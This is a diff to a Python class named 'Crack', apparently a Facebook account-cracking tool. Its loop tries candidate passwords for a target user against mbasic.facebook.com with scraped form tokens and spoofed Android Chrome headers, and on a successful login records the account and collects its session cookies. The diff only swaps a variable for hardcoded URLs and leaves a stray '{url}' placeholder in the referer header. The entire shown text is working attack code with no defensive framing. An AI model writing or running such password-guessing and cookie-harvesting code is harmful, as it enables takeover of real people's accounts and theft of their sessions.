@@ -411,8 +411,7 @@ class Crack:
 		try:
 			for pw in pwx:
 				pw = pw.lower()
-				url =  ("mbasic.facebook.com")
-				r = ses.get(f"https://{url}/login/?next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%3Frefsrc%3Ddeprecated&ref=dbl&fl")
+				r = ses.get("https://mbasic.facebook.com/login/?next=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2Fsave-device%3Frefsrc%3Ddeprecated&ref=dbl&fl")
 				params = {
 					'lsd': re.search('name="lsd" value="(.*?)"',str(r.text)).group(1), 
                  'jazoest': re.search('name="jazoest" value="(.*?)"',str(r.text)).group(1),
@@ -420,14 +419,14 @@ class Crack:
                  'li': re.search('name="li" value="(.*?)"',str(r.text)).group(1), 
                  'try_number': '0', 'unrecognized_tries': '0', 'email': user, 'masked_cp': '', 'pass': pw,'login': 'Masuk', 'bi_xrwh': '0'}
 				headers = {
-					"Host": url,
+					"Host": "mbasic.facebook.com",
                 "content-length": "200",
                 "cache-control": "max-age=0",
                 'sec-ch-ua': '"Google Chrome";v="107", "Chromium";v="107", "Not=A?Brand";v="24"',
                 "sec-ch-ua-mobile": "?1",
                 "sec-ch-ua-platform": '"Android"',
                 "upgrade-insecure-requests": '"1"',
-                "origin": "https://"+url,
+                "origin": "https://mbasic.facebook.com",
                 "content-type": "application/x-www-form-urlencoded",
                 "user-agent": ua,
                 "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
@@ -435,10 +434,10 @@ class Crack:
                 "sec-fetch-mode": "navigate",
                 "sec-fetch-user": "?1",
                 "sec-fetch-dest": "document",
-				"referer": "https://"+url+"/login/?next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%3Frefsrc%3Ddeprecated&ref=dbl&fl",
+				"referer": "https://mbasic.facebook.com/login/?next=https%3A%2F%2F{url}%2Flogin%2Fsave-device%3Frefsrc%3Ddeprecated&ref=dbl&fl",
 				"accept-encoding": "gzip, deflate, br",
 				"accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
-				post = ses.post(f"https://{url}/login/device-based/regular/login/?next=https%3A%2F%2Ffree.facebook.com%2Flogin%2Fsave-device%3Frefsrc%3Ddeprecated&refsrc=deprecated&lwv=101&ref=dbl",params=params, headers=headers, allow_redirects=False)
+				post = ses.post("https://mbasic.facebook.com/login/device-based/regular/login/?next=https%3A%2F%2Ffree.facebook.com%2Flogin%2Fsave-device%3Frefsrc%3Ddeprecated&refsrc=deprecated&lwv=101&ref=dbl",params=params, headers=headers, allow_redirects=False)
 				if "session_key" in post.text and "EAA" in post.text:
 					self.ok.append(user)
 					coki = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
